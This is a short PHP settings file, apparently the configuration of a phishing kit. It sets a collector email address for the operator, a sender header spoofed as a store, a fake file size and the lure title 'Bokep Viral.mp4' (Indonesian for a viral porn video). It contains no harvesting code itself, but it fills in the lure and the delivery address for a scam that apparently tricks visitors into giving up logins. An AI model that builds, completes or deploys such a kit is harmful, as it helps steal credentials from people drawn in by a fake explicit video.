<?php

$emailku = 'bagasarya752@gmail.com'; // EMAIL KAMU

$sender = 'From: 🔫 Bagas Arya 🔫 <store@bagasarya.com>'; 

$ukuran = '12,2MB' ; 
$judul = 'Bokep Viral.mp4' ; 
?>
